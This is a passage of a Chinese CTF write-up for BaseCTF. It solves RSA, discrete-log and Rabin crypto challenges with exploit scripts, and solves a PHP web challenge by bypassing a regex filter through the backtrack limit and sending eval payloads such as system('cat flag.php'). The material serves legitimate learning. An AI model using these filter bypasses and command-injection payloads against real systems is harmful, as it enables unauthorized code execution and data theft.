+<li>询问3将验证用户是否推出随机生成的假flag，如果验证通过，返回用户真flag，结束通信；验证不通过也会直接结束通信</li>
+</ul>
+<p>询问1恰好可以直接套parity oracle攻击的流程，但是最后解密出来的两个原文字符串不知道为什么最后一个字节的信息都是无效的乱码。经过本地模拟随机flag的生成流程，可以发现两个字符串最后一个字符其实是固定的：</p>
+<p><img src="image-23.png" alt="alt text"></p>
+<p>那么直接忽略尾部字符，自己补上正确的字符，然后拼接并发送，即可接收到flag，exp如下：</p>
+<pre><code class="language-python">from pwn import *
+from Crypto.Util.number import *
+import math
+import gmpy2
+
+import socketserver
+import numpy as np
+import random
+import ast
+import os
+
+import time
+
+host = remote('challenge.basectf.fun', 45442)
+
+def recv():
+    y = &quot;&quot;
+    while len(y.split(&quot;\n&quot;)) != 4 + 1:
+        y += host.recv().decode()
+    return y
+
+def send(t):
+    host.send(t.encode())
+
+def decrypt_io(c):
+    host.send(&quot;1&quot;.encode())
+    host.send(str(c).encode())
+    
+    tmp = host.recv()[:-1].decode()
+    print(tmp)
+    return int(tmp)
+
+def guess_m(n, e, c):# parity oracle攻击
+    k=1
+    lb=0
+    ub=n
+    while ub!=lb:
+        tmp = c * gmpy2.powmod(2, k*e, n) % n
+        if decrypt_io(tmp) == 1:
+            lb = (lb + ub) // 2
+        else:
+            ub = (lb + ub) // 2
+        k+=1
+    print(ub,len(long_to_bytes(ub)))
+    print(long_to_bytes(ub)[:-1]) # 忽略最后一个无意义字符
+    return long_to_bytes(ub)[:-1]
+
+raw = recv()
+raw = raw.split(&quot;\n&quot;)
+n = int(raw[0][4:])
+e = int(raw[1][4:])
+c1 = int(raw[2][4:])
+c2 = int(raw[3][4:])
+print(n)
+
+c1_ = c2
+HighByte = 0
+offset = 0
+
+flag = guess_m(n, e, c1) + b'-' + guess_m(n, e, c2) + b'}'
+print(flag)
+
+host.send(b'3')
+host.send(flag) #发送假flag
+print(host.recv()[:-1].decode()) #接收真flag
+input(&quot;press any key to continue...&quot;)
+</code></pre>
+<p><img src="image-24.png" alt="alt text"></p>
+<h2 id="week3-exgcd">[Week3] exgcd</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+
+flag=b'BaseCTF{}'
+m=bytes_to_long(flag)
+
+p=getPrime(1024)
+q=getPrime(1024)
+
+n=p*q
+e1=3747
+e2=2991
+
+c1=pow(m,e1,n)
+c2=pow(m,e2,n)
+
+print(&quot;n =&quot;,n)
+print(&quot;e1 =&quot;,e1)
+print(&quot;e2 =&quot;,e2)
+print(&quot;c1 =&quot;,c1)
+print(&quot;c2 =&quot;,c2)
+
+&quot;&quot;&quot;
+n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307
+e1 = 3747
+e2 = 2991
+c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083
+c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293
+&quot;&quot;&quot;
+</code></pre>
+<p>一眼共模攻击，但是e1，e2不互质，根据简单数论知识可以找到一对s，t使得</p>
+<p>$ se_1 + te_2 = \gcd(e_1, e_2) $</p>
+<p>通过共模攻击，可以求出：</p>
+<p>$ c&rsquo; = c_1^sc_2^t = m^{se_1 + te_2} \equiv m^{\gcd(e_1, e_2)}~mod~n $</p>
+<p>而 $ \gcd(e_1, e_2) $ 的值很小（为3），再考虑低指数加密攻击，即可求出flag</p>
+<p>exp如下：</p>
+<pre><code class="language-python">n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307
+e1 = 3747
+e2 = 2991
+c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083
+c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293
+
+r, s1, s2 = gmpy2.gcdext(e1, e2)#共模攻击
+m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
+print(m)
+
+#c3 = 14851967186687357887931104367843874005997333080529679568798848675124774626396386951125457645089954605149486033605473291716724977051508146917839969707029086668012020198122164445121668858081418333300440192507433360521421467165336389543031007878714399942378017920326914017317025843683512989153985497682678548061595220400469670139368891944327224429752849752027998915113891375920069101334335859705694989973282650491829169980019690348384245405309519033838346997654342050562230459723819995355078122774390944864306336853454846661666846353418491581326366890208307171615340045926391703365295842519938250048451319780371910509328
+c3 = m
+e3 = r
+
+def de(c, e, n):#低指数加密攻击
+    k = 0
+    while True:
+        m = c + n*k
+        result, flag = gmpy2.iroot(m, e)
+        if True == flag:
+            return result
+        k += 1
+        print(k)
+
+m=de(c3,e3,n)
+print(m)
+print(long_to_bytes(m))#b'BaseCTF{feb7e1ae-a8f7-4fc4-8d6d-945a45cc3f6d}'
+</code></pre>
+<h2 id="week3-ez_log">[Week3] ez_log</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b, getPrime
+from Crypto.Cipher import AES
+from random import randint
+
+def encrypt(KEY):
+    cipher= AES.new(KEY,AES.MODE_ECB)
+    encrypted =cipher.encrypt(flag)
+    return encrypted
+def decrypt(KEY):
+    cipher= AES.new(KEY,AES.MODE_ECB)
+    decrypted =cipher.decrypt(enc)
+    return decrypted
+pad = lambda x: x+b'\x00'*(16-len(x)%16)
+
+flag = b&quot;flag{test_flag}&quot;
+
+def encrypt(KEY):
+    cipher= AES.new(KEY,AES.MODE_ECB)
+    encrypted =cipher.encrypt(flag)
+    return encrypted
+def decrypt(KEY):
+    cipher= AES.new(KEY,AES.MODE_ECB)
+    decrypted =cipher.decrypt(enc)
+    return decrypted
+
+flag = pad(flag)
+x = randint(10 ** 7, 10 ** 8)
+y = randint(10 ** 7, 10 ** 8)
+n = getPrime(28)
+z = pow(y, x, n)
+
+enc = encrypt(pad(l2b(x)))
+print(f'enc = {b2l(enc)}')
+print(f'y = {y}')
+print(f'n = {n}')
+print(f'z = {z}')
+</code></pre>
+<p>用x作为秘钥对flag进行了AES加密，想解码只能去想办法拿到x，而想要x，就得解出 $y^x = z~mod~n$，也就是离散对数（模意义下的对数），直接用BGSG算法秒了</p>
+<p>exp如下：</p>
+<pre><code class="language-python">#a^x = b mod m
+def BGSG(a, b, m):
+    mp = {}
+    r = b * a % m
+    t = int(m**0.5 + 1)
+    for B in range(1, t + 1):
+        mp[r] = B
+        r = (r * a) % m
+    at = pow(a, t, m)
+    l = at
+    for A in range(1, t + 1):
+        if l in mp:
+            return A * t - mp[l]
+        l = (l * at) % m 
+    return -1
+
+y = 82941012
+n = 228338567
+z = 51306718
+x = BGSG(y, z, n)#38806815
+
+enc = 33416570913716503492297352041317858420349510954381249751537743898024527101872454706181188441210166165803904185550746
+enc = l2b(enc)
+flag = decrypt(pad(l2b(x)))
+print(flag)#b'BaseCTF{BF3DCONZ-67FE-ENZU-385S-CSNI13B2}\x00\x00\x00\x00\x00\x00\x00'
+</code></pre>
+<h2 id="week3-wiener">[Week3] wiener?</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import decimal
+flag=b&quot;BaseCTF{}&quot;
+m = bytes_to_long(flag)
+
+p = getPrime(1024)
+q = getPrime(1024)
+n=p*q
+
+e=65537
+c=pow(m,e,n)
+
+print(&quot;e =&quot;,e)
+print(&quot;c =&quot;,c)
+
+decimal.getcontext().prec = 648
+P=decimal.Decimal(p)
+Q=decimal.Decimal(q)
+leak=decimal.Decimal((3*P*Q-1)/(3*Q*Q))
+print(&quot;leak =&quot;,leak)
+
+&quot;&quot;&quot;
+e = 65537
+c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057
+leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843
+&quot;&quot;&quot;
+</code></pre>
+<p>题目是wiener，考虑wiener攻击，由于p，q很大，leak约等于p/q，对leak进行连分数展开，当展开的p，q的二进制长度均为1024时，尝试解密，即可解出flag</p>
+<p>exp如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import decimal
+import gmpy2
+
+def continuedFra(x, y):
+    &quot;&quot;&quot;计算连分数
+    :param x: 分子
+    :param y: 分母
+    :return: 连分数列表
+    &quot;&quot;&quot;
+    cf = []
+    while y:
+        cf.append(x // y)
+        x, y = y, x % y
+    return cf
+
+def gradualFra(cf):
+    &quot;&quot;&quot;计算传入列表最后的渐进分数
+    :param cf: 连分数列表
+    :return: 该列表最后的渐近分数
+    &quot;&quot;&quot;
+    numerator = 0 # 分子
+    denominator = 1 # 分母
+    for x in cf[::-1]:
+        # 这里的渐进分数分子分母要分开
+        numerator, denominator = denominator, x * denominator + numerator
+    return numerator, denominator
+
+def getGradualFra(cf):
+    &quot;&quot;&quot;计算列表所有的渐近分数
+    :param cf: 连分数列表
+    :return: 该列表所有的渐近分数
+    &quot;&quot;&quot;
+    gf = []
+    for i in range(1, len(cf) + 1):
+        gf.append(gradualFra(cf[:i]))
+    return gf
+
+e = 65537
+c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057
+fz = 829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843
+fm = pow(10, 648)
+for z in getGradualFra(continuedFra(fz, fm)):
+    p, q = z
+    if len(bin(p)[2:]) == 1024 and len(bin(q)[2:]) == 1024:
+            phi = (p - 1) * (q - 1)
+            d = gmpy2.invert(e, phi)
+            m = pow(c, d, p * q)
+            m = long_to_bytes(m)
+            print(m)#b'BaseCTF{9431ee53-5d5c-4b0b-956f-1eafff6c9e87}'
+</code></pre>
+<h2 id="week3-没有n啊">[Week3] 没有n啊</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+
+flag=b'BaseCTF{}'
+m=bytes_to_long(flag)
+
+p=getPrime(512)
+q=getPrime(512)
+
+n=p*q
+e=65537
+
+phi=(p-1)*(q-1)
+d=gmpy2.invert(e,phi)
+
+c=pow(m,e,n)
+x=pow(n,e,c)
+print(&quot;c =&quot;,c)
+print(&quot;e =&quot;,e)
+print(&quot;d =&quot;,d)
+print(&quot;x =&quot;,x)
+'''
+c = 52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558
+e = 65537
+d = 54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641
+x = 40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437
+'''
+</code></pre>
+<p>分析完逻辑后，d都给了，想要解密就只需要拿到n就行了，解题切入点是那句奇怪的x = pow(n,e,c)。</p>
+<ul>
+<li>对于RSA加密后的密文 $c=m^e~mod~n$ 进行解密，需要用到 $de = 1~mod~\varphi(n)$ 中的 $d$，也就是模 $\varphi(n)$ 下 $e$ 的逆元</li>
+<li>$\varphi(n)$ 是欧拉函数，代表小于等于 $n$ 并与 $n$ 互质的数的个数，有一种简便计算方法如下：</li>
+</ul>
+<p>$\varphi(n)=\prod (p_i - 1)^{c_i}$</p>
+<p>其中 $p_i$ 为 $n$ 的所有质因子，$c_i$ 为该质因子的个数。</p>
+<p>我们知道RSA之所以难以破解，是因为 $n$ 很难分解出质数 $p$ 和 $q$，但是如果 $n$ 很容易分解，那求 $\varphi(n)$ 不就易如反掌？</p>
+<p>对于pow(n,e,c)中的模数c，它是m加密后的密文，其质因数组成应该是不可控的，也就是说应该很容易对其进行质因数分解，到<a href="https://factordb.com/">https://factordb.com/</a>中直接暴力分解质因数，得到结果如下：</p>
+<p><img src="image-25.png" alt="alt text"></p>
+<p>那么 $\varphi(c)$ 就可以直接计算出，从而解出 $n$。</p>
+<p>exp如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+'''
+c=pow(m,e,n)#c一定比n小
+'''
+
+c = 52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558
+e = 65537
+d = 54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641
+x = 40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437
+
+phic = (2 - 1) * (3 - 1) * (73 - 1) * (3967 - 1) * (6373 - 1) * (95592293 - 1) * (216465863 - 1) *(4744823012787277141 - 1) * (48245998253859255581546561942142167304434549996919484957120717763726325509833409296170471619434291990255044694414983821250538266717293535917534918221352198192885071310932646412147737114561229291373456448363184353049796801297876664512630305475226391199481032049429 - 1)
+print(phic)
+
+d2=gmpy2.invert(e,phic)
+#注意一个坑，由c=pow(m,e,n)算出的c一定比会n小，而由n=pow(x,d2,c)解出来的n一定比c小
+#所以要在解出来的n后面加上k倍的c一个个把真正的n试出来，这题运气好，加一个c就找出真正的n了
+n = pow(x, d2, c) + c
+m = pow(c, d, n)
+print(long_to_bytes(m))#b'BaseCTF{2eefa8ef-ba57-4bed-9230-d280ac2273d8}'
+</code></pre>
+<h2 id="week3-没有n啊-_pro">[Week3] 没有n啊 _pro</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+
+flag=b'BaseCTF{}'
+m=bytes_to_long(flag)
+p=getPrime(128)
+q=getPrime(128)
+
+n=p*q
+e=65537
+
+phi=(p-1)*(q-1)
+d=gmpy2.invert(e,phi)
+
+assert d&lt;phi
+
+c=pow(m,e,n)
+print(&quot;c =&quot;,c)
+print(&quot;e =&quot;,e)
+print(&quot;d =&quot;,d)
+&quot;&quot;&quot;
+c = 78919950899709764543039048006935881842075789773495004639436106636461009323420
+e = 65537
+d = 13002488326322253055272696035053386340217207134816593767440035447757509399233
+&quot;&quot;&quot;
+</code></pre>
+<p>相比上题1，此题给的信息更少了，但是数据也更小了，根据定义式 $ed = 1~mod~n$ 可推知 $ed - 1 | n$ ，即：$n = k(ed - 1)$，我们尝试将 $ed - 1$ 丢到factordb去分解质因数，得到了FF(Fully Factored)的喜报：</p>
+<p><img src="image-26.png" alt="alt text"></p>
+<p>然后我们直接暴力穷举所有因数的组合即可，详见代码（请原谅这个ACMer式的抽象码风）：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+
+ccc = 78919950899709764543039048006935881842075789773495004639436106636461009323420
+e = 65537
+d = 13002488326322253055272696035053386340217207134816593767440035447757509399233
+
+print(e*d-1)
+
+import itertools
+f = [2, 2, 2, 2, 3, 5, 7, 11, 23, 37, 37, 107, 109, 2459411, 387743680517, 8461199191085678833423, 3890467155441207614773027481]#对phi/4分解质因数（用factordb.com）
+
+vaild = []
+
+for l in range(1, len(f) + 1):
+    for c in itertools.combinations(f, l):
+        p = 4
+        z = [2, 2]
+        for i in c:
+            p *= i
+            z.append(i)
+        if len(bin(p)[2:]) == 256:#暴力枚举出所有二进制长度为256的因数（128+128）
+            vaild.append(z)
+
+s = set()
+print(len(vaild))#242
+
+cnt = 0
+for ff in vaild:
+    v = 1
+    for i in ff:
+        v *= i
+    for l in range(1, len(ff)):
+        for c in itertools.combinations(ff, l):
+            p = 1
+            for i in c:
+                p *= i
+            if p % 2 == 0 and (v // p) % 2 == 0 and len(bin(p + 1)[2:]) == 128 and len(bin(v // p + 1)[2:]) == 128:#检验其是否能表示为两个二进制长度为128的偶数
+                s.add((p + 1) * (v // p + 1))#先不管它是不是只有俩质因数，塞进去再说，能满足上述分解条件的数不是很多，只有300左右
+            if cnt % 1000000 == 0:
+                print(cnt, len(s))#调试输出一些数据量，让你知道程序没死
+            cnt += 1
+
+for n in s:#暴力枚举n的所有可能
+    m = pow(ccc, d, n)
+    t = long_to_bytes(m)
+    if t[:7] == b'BaseCTF':
+        print(t)#b'BaseCTF{3e226a94-babb27696416}'
+</code></pre>
+<p>跑得挺快，六七秒就爆出来了：</p>
+<p><img src="image-27.png" alt="alt text"></p>
+<h2 id="week4-rabin">[Week4] rabin</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+import libnum
+
+flag=b&quot;BaseCTF{}&quot;
+m = bytes_to_long(flag)
+
+p = getPrime(512)
+q = getPrime(512)
+assert p%4==3 and q%4==3
+n = p*q
+e = 4
+
+c = pow(m,e,n)
+print(&quot;p=&quot;,p)
+print(&quot;q=&quot;,q)
+print(&quot;n=&quot;,n)
+print(&quot;c=&quot;,c)
+print(&quot;e=&quot;,e)
+</code></pre>
+<p>题目是rabin，查到一些有关资料<a href="https://zhuanlan.zhihu.com/p/533927542">https://zhuanlan.zhihu.com/p/533927542</a>，看不懂或懒得看？那么你只需要知道，rabin攻击可以求指数e为2时的四个可能的原文。</p>
+<p>但是题目的e是4，不是2怎么办？其实不重要，把 $m^4$ 当成 $(m^2)^2$，那跑两次rabin攻击不就行了？</p>
+<p>exp如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+import libnum
+
+p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843
+q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871
+n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253
+c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353
+e= 4
+
+def rabin(c,p,q):
+    mp = pow(c, (p + 1) // 4, p)
+    mq = pow(c, (q + 1) // 4, q)
+    inv_p = gmpy2.invert(p, q)
+    inv_q = gmpy2.invert(q, p)
+     
+    a = (inv_p * p * mq + inv_q * q * mp) % n
+    b = n - int(a)
+    c = (inv_p * p * mq - inv_q * q * mp) % n
+    d = n - int(c)
+    return a,b,c,d
+ 
+aa, bb, cc, dd = rabin(c,p,q)#两次rabin秒了
+
+for j in rabin(aa,p,q):
+    m = long_to_bytes(int(j))
+    if m[:7] == b'BaseCTF':
+        print(m)#b'BaseCTF{01c28b9c-7924-4c04-b71d-1cca15342618}'
+</code></pre>
+<h2 id="week4-哎呀数据丢失了">[Week4] 哎呀数据丢失了</h2>
+<pre><code class="language-python">from Crypto.Util.number import *
+from gmpy2 import *
+from Crypto.PublicKey import RSA
+
+flag=b&quot;a&quot;
+m=bytes_to_long(flag)
+
+rsa=RSA.generate(1024)
+print(rsa)
+c=pow(m,rsa.e,rsa.n)
+
+with open(&quot;out&quot;,'wb') as f:
+    f.write(long_to_bytes(c))
+
+private_key=rsa.exportKey(&quot;PEM&quot;)
+with open(&quot;pri.pem&quot;,'wb') as f:
+    f.write(private_key)
+</code></pre>
+<p>还是一个RSA，只不过用文件保存了RSA加密的私钥，打开文件一看，私钥文件缺了一大半，out里的信息倒是没缺（你也看不出来缺没缺，就当这个没缺吧）</p>
+<p><img src="image-28.png" alt="alt text"></p>
+<p>但是不急，我们上网查找PEM文件格式的解析<a href="https://zhuanlan.zhihu.com/p/461349946">(PKCS1) RSA 公私钥 pem 文件解析</a>：</p>
+<p><img src="image-29.png" alt="alt text"></p>
+<p>对比后可以发现，私钥文件缺的只是俩个素数的信息，而d，n的信息都在前面，刚好没丢失。</p>
+<p>用cyberchef将现有的Base64导入，解码并转成字节，然后对着右图的定义一个个数字节，把n和d分别提取出来，再分别转回Base64后，就可以写exp解flag了</p>
+<p>exp如下：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+from gmpy2 import *
+from Crypto.PublicKey import RSA
+import base64 as b64
+
+n = b64.b64decode(&quot;vSeEhBIq75pp7GRykCGd7Qbt0rdhFyGzJoULL1Bg2u7XaUNWZnxHnKnMtpafT75tx/pnWayiHYqWqIGo5KAhdzJ1fmSdUDGRUR+pbaQu0dovo7yMnGX72cDdb0MDWaxF5FXTLFsOop0h5kf/gOUKvLuA92rbZwB6BOhduutMjx0=&quot;)
+n = bytes_to_long(n)
+
+d = b64.b64decode(&quot;ImXjVVkwca41AQYrR0a1v3r5GM68W0aHm8OqCwqk8mtoxP234p9LLpQ6ZCH0Cr5onGtPDCG2wYSIbVBW9GyiaQhUDsB7gq1H5meXGgH6xhYuk6f8Ya7VZg+CauujTXiszRj8WeeSFwHxD/UdUog3BrhkKHz9s04wnJOCnSnYZ8k=&quot;)
+d = bytes_to_long(d)
+
+with open(&quot;out&quot;, 'rb') as f:
+    c = f.read()
+c = bytes_to_long(c)
+
+m = pow(c, d, n)
+m = long_to_bytes(m)
+print(m)#b'BaseCTF{57e6c35a-2768-49f9-8aca-47a3abcff1c7}'
+</code></pre>
+<h1 id="pwn">Pwn</h1>
+<p>不会，下次一定学</p>
+<h1 id="web">Web</h1>
+<h2 id="fin-1z_php">[Fin] 1z_php</h2>
+<p>题目php源码如下：</p>
+<pre><code class="language-php">&lt;?php
+highlight_file('index.php');
+# 我记得她...好像叫flag.php吧？
+$emp=$_GET['e_m.p'];
+$try=$_POST['try'];
+if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)
+{
+    for ($i=0;$i&lt;strlen($emp);$i++){
+        if (ctype_alpha($emp[$i])){
+            die(&quot;你不是hacker？那请去外场等候！&quot;);
+        }
+    }
+    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;
+
+    if (preg_match('/.+?HACKER/is',$try)){
+        die(&quot;你是hacker还敢自报家门呢？&quot;);
+    }
+    if (!stripos($try,'HACKER') === TRUE){
+        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);
+    }
+
+    $a=$_GET['a'];
+    $b=$_GET['b'];
+    $c=$_GET['c'];
+    if(stripos($b,'php')!==0){
+        die(&quot;收手吧hacker，你得不到flag的！&quot;);
+    }
+    echo (new $a($b))-&gt;$c();
+}
+else
+{
+    die(&quot;114514到底是啥意思嘞？。？&quot;);
+}
+# 觉得困难的话就直接把shell拿去用吧，不用谢~
+$shell=$_POST['shell'];
+eval($shell);
+?&gt;
+</code></pre>
+<p>先想办法给$emp传参，要注意一个坑：</p>
+<ul>
+<li>当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这
+个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</li>
+</ul>
+<p>那么“e_m.p”应该传入的GET参数名其实应该是“e[m.p”。</p>
+<p>再考虑怎么绕过这几句和$emp有关的判断：</p>
+<pre><code class="language-php">if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)
+{
+    for ($i=0;$i&lt;strlen($emp);$i++){
+        if (ctype_alpha($emp[$i])){
+            die(&quot;你不是hacker？那请去外场等候！&quot;);
+        }
+    }
+</code></pre>
+<p>只需要让$emp为“114514[任意非数字、非字母字符]”即可，比如“114514*”</p>
+<p>再考虑怎么绕过这个和$try有关的判断：</p>
+<pre><code class="language-php">if (preg_match('/.+?HACKER/is',$try)){
+        die(&quot;你是hacker还敢自报家门呢？&quot;);
+    }
+    if (!stripos($try,'HACKER') === TRUE){
+        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);
+    }
+</code></pre>
+<p>第一个preg_match过滤了“[任意数量任意字符]HACKER”（不区分大小写）这种模式串，第二个stripos则要求“HACKER”（不区分大小写）前面必须有字符。</p>
+<p>这两个条件显然是冲突的，那么只能考虑用某种方法破坏掉其中一个。上网查询资料得知：</p>
+<ul>
+<li>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
+回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</li>
+</ul>
+<p>那么我们可以构造一个长度为百万级别的字符串，把preg_match爆了（最大回溯次数绕过），后面的stripos也能正常识别到后面的“HACKER”子串。</p>
+<p>到了最后一步，题目给了$shell接口，可以直接eval，那么我们只要保证下面这段代码正确执行就行了：</p>
+<pre><code class="language-php">    $a=$_GET['a'];
+    $b=$_GET['b'];
+    $c=$_GET['c'];
+    if(stripos($b,'php')!==0){
+        die(&quot;收手吧hacker，你得不到flag的！&quot;);
+    }
+    echo (new $a($b))-&gt;$c();
+</code></pre>
+<p>与其想方设法构造特定的代码在这一步拿到flag，不如跳过这一步，在后面那个eval随心所欲地执行任何代码。</p>
+<p>直接找GPT要一组合法的参数并传入即可：</p>
+<p><img src="image-30.png" alt="alt text"></p>
+<p>最后一步就是找出flag在哪了，先ls一下</p>
+<p><img src="image-31.png" alt="alt text"></p>
+<p>得知flag就在当前目录下，直接cat flag.php就可以拿到flag了</p>
+<p><img src="image-32.png" alt="alt text"></p>
+<p>完整exp如下：</p>
+<pre><code class="language-python">import requests
+url=&quot;http://challenge.basectf.fun:22109/&quot;
+
+data={
+        'try':'I AM '*200001+'HACKER!!',#构造百万级别字符串，让preg_match罢工
+        &quot;shell&quot;:&quot;system('cat flag.php');&quot;#&quot;system('ls');&quot;
+}
+params={
+        &quot;e[m.p&quot;:&quot;114514*&quot;,
+        &quot;a&quot;:&quot;Exception&quot;,
+        &quot;b&quot;:&quot;phpinfo&quot;,
+        &quot;c&quot;:&quot;getMessage&quot;
+}
+r=requests.post(url,data = data,params = params)
+t = r.text
+print(t[t.find(&quot;phpinfo&quot;) + 7:])#&lt;?php =BaseCTF{0af93c1d-a584-42c0-a928-4726264e4fb8}?&gt;
+</code></pre>
+<h2 id="week2-一起吃豆豆">[Week2] 一起吃豆豆</h2>
+<p>直接F12开发者，切换至“网络”，然后刷新出资源文件，在“index.js”中，翻到最下面可以看到一串Base64编码，复制到cyberchef解密出来就可以拿到flag了</p>
+<p><img src="image-33.png" alt="alt text">
